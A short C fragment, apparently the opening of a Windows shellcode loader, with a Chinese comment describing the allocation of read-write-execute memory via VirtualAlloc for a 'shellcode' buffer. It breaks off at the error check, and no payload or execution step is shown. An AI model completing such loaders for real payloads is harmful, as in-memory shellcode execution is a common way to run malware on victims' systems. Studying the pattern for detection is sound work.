int main()
{
    // 1. 分配一块具有读、写、执行权限的内存
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed with error: %lu\n", GetLastError());
